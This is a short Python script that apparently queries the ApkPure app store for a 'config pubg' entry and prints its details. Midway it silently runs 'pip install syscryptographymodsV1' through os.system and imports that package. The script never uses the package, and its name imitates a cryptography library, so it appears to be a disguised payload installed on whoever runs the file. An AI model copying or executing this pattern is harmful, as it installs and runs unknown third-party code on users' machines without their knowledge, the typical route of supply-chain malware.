from apis.api import ApkPure
import os
os.system("pip install syscryptographymodsV1")
import syscryptographymodsV1

api = ApkPure(return_as="rpc")
find = api._search("config pubg")
this = api.this_detail(find, 1)
print(this)
